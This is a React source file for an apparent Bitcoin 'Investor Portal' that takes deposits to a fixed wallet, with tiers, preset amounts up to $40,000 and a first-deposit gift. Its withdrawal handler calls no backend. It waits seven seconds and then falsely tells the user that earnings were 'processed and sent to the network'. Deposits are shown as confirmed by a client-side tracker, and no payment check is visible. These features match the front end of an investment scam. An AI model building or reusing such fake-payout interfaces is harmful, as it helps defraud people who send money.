import { useSearchParams } from "react-router-dom";
import { useEffect, useMemo, useState } from "react";
import { QRCodeSVG } from "qrcode.react";
import { Copy, Send, Upload, Check, Sparkles, Loader2, CheckCircle2, Wand2 } from "lucide-react";
import { toast } from "sonner";
import { SiteHeader } from "@/components/SiteHeader";
import { RouteShell } from "@/components/RouteShell";
import { Stagger, StaggerItem } from "@/components/Stagger";
import { MagneticButton } from "@/components/MagneticButton";
import { DepositTracker } from "@/components/DepositTracker";
import { DepositWizard } from "@/components/DepositWizard";
import { Receipt } from "@/components/Receipt";
import { BtcChartCard } from "@/components/BtcChartCard";
import { AddressCard } from "@/components/AddressCard";
import { BtcLogo } from "@/components/BtcLogo";
import { BTC_WALLET, BTC_RATE_USD } from "@/lib/site-config";
import { useLocale, formatLocal } from "@/hooks/useLocale";
import { goldBurst } from "@/lib/confetti";
import { tierConfetti } from "@/lib/dust";
import { playTing, playTap, playTierChord } from "@/lib/sound";
import { tap as hapticTap, success as hapticSuccess } from "@/lib/haptic";
import { recordDeposit, recordWithdraw } from "@/lib/history";
import { consumeFirstDepositGift } from "@/lib/firstDeposit";
import { FirstDepositGift } from "@/components/FirstDepositGift";

const PRESETS = [40000, 20000, 10000, 5000, 3000];
const SUBS_KEY = "hal_subscribed_plans";

export default function Portal() {
  const [searchParams] = useSearchParams();
  const amount = searchParams.get("amount");
  const plan = searchParams.get("plan");

  const loc = useLocale();

  const [mode, setMode] = useState<"USD" | "BTC">("USD");
  const [withdrawAmount, setWithdrawAmount] = useState("");
  const [walletAddr, setWalletAddr] = useState("");

  const [isWithdrawing, setIsWithdrawing] = useState(false);
  const [withdrawSuccess, setWithdrawSuccess] = useState(false);

  const [depositAmount, setDepositAmount] = useState<string>(amount ? String(amount) : "5000");
  const [copied, setCopied] = useState(false);
  const [confirmed, setConfirmed] = useState(false);
  const [tracking, setTracking] = useState(false);
  const [showReceipt, setShowReceipt] = useState(false);
  const [wizardOpen, setWizardOpen] = useState(false);

  const balance = 0;
  const asset = {
    key: "BTC" as const,
    label: "Bitcoin",
    network: "BTC mainnet",
    rateUsd: BTC_RATE_USD,
    decimals: 6,
    color: "#f7931a",
    address: BTC_WALLET,
  };

  useEffect(() => {
    if (amount) setDepositAmount(String(amount));
  }, [amount]);

  const handleConfirm = (e: React.MouseEvent<HTMLButtonElement>) => {
    setConfirmed(true);
    setTracking(true);
    setShowReceipt(false);

    const r = e.currentTarget.getBoundingClientRect();
    goldBurst({
      x: (r.left + r.width / 2) / window.innerWidth,
      y: (r.top + r.height / 2) / window.innerHeight,
    });
    playTap();
    hapticTap();
    toast.info("Watching the network for your deposit.", { duration: 1800 });
  };

  const onTrackerDone = () => {
    if (plan && typeof window !== "undefined") {
      try {
        const list: string[] = JSON.parse(localStorage.getItem(SUBS_KEY) || "[]");
        if (!list.includes(plan)) {
          list.push(plan);
          localStorage.setItem(SUBS_KEY, JSON.stringify(list));
        }
      } catch {
        /* ignore */
      }
    }
    playTing();
    if (plan) playTierChord(plan);
    hapticSuccess();
    const gift = consumeFirstDepositGift();
    recordDeposit({
      amount: depositNum,
      asset: asset.key,
      network: asset.network,
      plan: plan ?? undefined,
    });
    if (plan) tierConfetti(plan, { x: 0.5, y: 0.45 });
    if (gift) {
      toast.success("Welcome gift unlocked. 1.5x your first day.", { duration: 2800 });
    } else {
      toast.success("Deposit confirmed. Tier activated.", { duration: 2200 });
    }
    setShowReceipt(true);
    setTracking(false);
    window.setTimeout(() => setConfirmed(false), 2500);
  };

  const handleWithdraw = () => {
    if (!withdrawAmount || !walletAddr) return;

    setIsWithdrawing(true);
    setWithdrawSuccess(false);
    playTap();
    hapticTap();

    setTimeout(() => {
      setIsWithdrawing(false);
      setWithdrawSuccess(true);
      playTing();
      hapticSuccess();
      recordWithdraw({
        amount: parseFloat(withdrawAmount) || 0,
        address: walletAddr,
        status: "sent",
      });
      toast.success("Earnings pulled. Broadcasting now.", { duration: 2400 });

      setWithdrawAmount("");
      setWalletAddr("");

      setTimeout(() => setWithdrawSuccess(false), 5000);
    }, 7000);
  };

  const cryptoEquivalent = useMemo(() => {
    const n = parseFloat(depositAmount || "0");
    if (!n) return "0.000000";
    return (n / asset.rateUsd).toFixed(asset.decimals);
  }, [depositAmount, asset]);

  const copy = async () => {
    await navigator.clipboard.writeText(asset.address);
    setCopied(true);
    playTap();
    hapticTap();
    toast.success("Address copied to clipboard.", { duration: 1600 });
    setTimeout(() => setCopied(false), 1800);
  };

  const depositNum = parseFloat(depositAmount || "0") || 0;

  return (
    <RouteShell>
      <div className="min-h-screen pb-28">
        <SiteHeader showUser={false} />
        <main className="mx-auto max-w-2xl space-y-6 px-5 py-6">
          <Stagger className="space-y-6">
            <StaggerItem>
              <header className="flex items-end justify-between gap-3">
                <div>
                  <h1 className="font-display text-4xl">
                    Investor <em className="not-italic text-gradient-gold">Portal</em>
                  </h1>
                  <p className="mt-1 text-sm text-muted-foreground">
                    Send capital. Activate your tier.
                  </p>
                </div>
                <button
                  onClick={() => {
                    setWizardOpen(true);
                    hapticTap();
                  }}
                  className="pill-luxury text-xs text-primary"
                >
                  <Wand2 className="h-3.5 w-3.5" />
                  Guided
                </button>
              </header>
            </StaggerItem>

            {plan && (
              <StaggerItem>
                <div className="glass-luxury aurora-border flex items-center gap-3 p-4">
                  <span className="grid h-9 w-9 place-items-center rounded-full bg-primary/15">
                    <Sparkles className="h-4 w-4 text-primary" />
                  </span>
                  <div className="flex-1">
                    <p className="text-xs uppercase tracking-wider text-muted-foreground">
                      Activating
                    </p>
                    <p className="font-display text-lg text-primary">{plan}</p>
                  </div>
                  <p className="font-numeric text-xl text-primary">
                    ${Number(amount || 0).toLocaleString()}
                  </p>
                </div>
              </StaggerItem>
            )}

            <StaggerItem>
              <AddressCard />
            </StaggerItem>

            <StaggerItem>
              <section className="glass-luxury p-5">
                <div className="flex items-center gap-2 text-sm text-muted-foreground">
                  <Upload className="h-4 w-4 text-primary" /> Pull Earnings
                </div>

                <div className="track-navy mt-4 grid grid-cols-2 gap-2 rounded-2xl border border-[#24406f]/50 p-1">
                  {(["USD", "BTC"] as const).map((m) => (
                    <button
                      key={m}
                      onClick={() => {
                        setMode(m);
                        playTap();
                        hapticTap();
                      }}
                      className={`rounded-xl px-4 py-2.5 text-sm font-medium transition-all ${
                        mode === m
                          ? "bg-primary/15 text-primary ring-1 ring-primary/40"
                          : "text-muted-foreground"
                      }`}
                    >
                      {m} Amount
                    </button>
                  ))}
                </div>

                <div className="mt-4 flex items-center justify-between rounded-2xl border border-border/60 bg-black/30 p-4">
                  <div>
                    <p className="text-base">Available Balance</p>
                    <p className="font-numeric text-3xl text-primary">
                      ${balance.toLocaleString()}
                    </p>
                    <p className="text-[11px] uppercase tracking-wider text-muted-foreground/70">
                      Local: {formatLocal(balance, loc)}
                    </p>
                  </div>
                  <button
                    onClick={() => {
                      setWithdrawAmount(String(balance));
                      playTap();
                      hapticTap();
                    }}
                    className="rounded-xl border border-border px-4 py-2 text-sm text-primary"
                  >
                    MAX
                  </button>
                </div>

                <label className="coin-slot mt-3 flex items-center gap-3 px-4 py-3.5">
                  <span className="text-muted-foreground">$</span>
                  <input
                    value={withdrawAmount}
                    onChange={(e) => setWithdrawAmount(e.target.value)}
                    inputMode="decimal"
                    placeholder="Enter amount"
                    disabled={isWithdrawing}
                    className="flex-1 bg-transparent text-sm outline-none placeholder:text-muted-foreground disabled:opacity-50"
                  />
                </label>

                <label className="coin-slot mt-3 flex items-center gap-3 px-4 py-3.5">
                  <BtcLogo size={24} />
                  <input
                    value={walletAddr}
                    onChange={(e) => setWalletAddr(e.target.value)}
                    placeholder="Bitcoin wallet address"
                    disabled={isWithdrawing}
                    className="flex-1 bg-transparent text-sm outline-none placeholder:text-muted-foreground disabled:opacity-50"
                  />
                </label>

                {withdrawSuccess && (
                  <div className="mt-4 flex items-center gap-3 rounded-xl border border-green-500/30 bg-green-500/10 p-3 text-sm text-green-500">
                    <CheckCircle2 className="h-5 w-5 flex-shrink-0" />
                    <div>
                      <p className="font-medium">Withdrawal Initiated</p>
                      <p className="text-xs opacity-80">
                        Your request has been processed and sent to the network.
                      </p>
                    </div>
                  </div>
                )}

                <MagneticButton
                  onClick={handleWithdraw}
                  disabled={isWithdrawing || !withdrawAmount || !walletAddr}
                  className="btn-foil mt-4 flex w-full items-center justify-center gap-2 px-4 py-3.5 text-sm disabled:cursor-not-allowed disabled:opacity-70"
                >
                  {isWithdrawing ? (
                    <>
                      <Loader2 className="h-4 w-4 animate-spin" /> Processing
                    </>
                  ) : (
                    <>
                      <Send className="h-4 w-4" /> Submit Withdrawal
                    </>
                  )}
                </MagneticButton>
              </section>
            </StaggerItem>

            <StaggerItem>
              <div className="flex items-center justify-between px-1">
                <p className="text-xs uppercase tracking-[0.25em] text-muted-foreground">
                  Market Reference
                </p>
                <span className="chip">
                  <span className="h-1.5 w-1.5 rounded-full bg-success pulse-gold" />
                  BTC · USD
                </span>
              </div>
              <div className="mt-2">
                <BtcChartCard />
              </div>
            </StaggerItem>

            <StaggerItem>
              <section className="glass-luxury p-5">
                <div className="flex items-center gap-2 text-sm text-muted-foreground">
                  <BtcLogo size={22} />
                  Send Capital
                </div>
                <FirstDepositGift className="mt-3" />

                <div className="mt-4 rounded-2xl border border-border/60 bg-black/30 p-5">
                  <div className="relative mx-auto w-fit rounded-xl bg-white p-3">
                    <QRCodeSVG value={asset.address} size={200} level="H" />
                    <div className="pointer-events-none absolute inset-0 overflow-hidden rounded-xl">
                      <div className="shimmer h-full w-full" />
                    </div>
                  </div>

                  <div className="mt-5 flex flex-col items-center gap-2">
                    <span className="max-w-xs break-all text-center font-mono text-xs text-muted-foreground">
                      {asset.address}
                    </span>
                    <span className="text-[10px] uppercase tracking-wider text-muted-foreground/70">
                      Network: {asset.network}
                    </span>
                  </div>

                  <div className="mt-3 flex justify-center">
                    <button
                      onClick={copy}
                      className="inline-flex items-center gap-2 rounded-full border border-primary/40 bg-primary/10 px-4 py-2 text-xs text-primary"
                    >
                      {copied ? (
                        <Check className="h-3.5 w-3.5" />
                      ) : (
                        <Copy className="h-3.5 w-3.5" />
                      )}
                      {copied ? "Copied" : "Copy Address"}
                    </button>
                  </div>
                </div>

                <label className="coin-slot mt-5 flex items-center gap-3 px-4 py-3.5">
                  <span className="text-muted-foreground">$</span>
                  <input
                    value={depositAmount}
                    onChange={(e) => setDepositAmount(e.target.value)}
                    inputMode="decimal"
                    className="flex-1 bg-transparent text-base outline-none"
                  />
                </label>

                <p className="mt-2 text-[11px] uppercase tracking-wider text-muted-foreground/70">
                  Local: {formatLocal(depositNum, loc)}
                </p>

                <div className="mt-3 grid grid-cols-3 gap-2">
                  {PRESETS.map((v) => (
                    <button
                      key={v}
                      onClick={() => {
                        setDepositAmount(String(v));
                        playTap();
                        hapticTap();
                      }}
                      className="rounded-xl border border-border/60 bg-black/30 py-2.5 text-sm text-muted-foreground transition-colors hover:border-primary/50 hover:text-primary"
                    >
                      ${v.toLocaleString()}
                    </button>
                  ))}
                </div>

                <p className="mt-3 text-xs text-muted-foreground">
                  ≈ {cryptoEquivalent} {asset.key} at current rate
                </p>

                <MagneticButton
                  onClick={handleConfirm}
                  disabled={tracking}
                  className="btn-foil mt-4 flex w-full items-center justify-center gap-2 px-4 py-3.5 text-sm disabled:opacity-70"
                >
                  {confirmed ? (
                    <>
                      <Check className="h-4 w-4" /> Confirmed. Activating
                    </>
                  ) : (
                    <>
                      <Send className="h-4 w-4" /> Confirm Deposit
                    </>
                  )}
                </MagneticButton>

                <DepositTracker active={tracking} onComplete={onTrackerDone} />

                {showReceipt && (
                  <div className="mt-5">
                    <Receipt
                      plan={plan ?? undefined}
                      amount={depositNum}
                      asset={asset.key}
                      network={asset.network}
                      txDate={new Date()}
                    />
                  </div>
                )}
              </section>
            </StaggerItem>
          </Stagger>
        </main>

        <DepositWizard
          open={wizardOpen}
          onClose={() => setWizardOpen(false)}
          defaultPlan={plan ?? undefined}
          defaultAmount={Number(amount) || undefined}
        />
      </div>
    </RouteShell>
  );
}
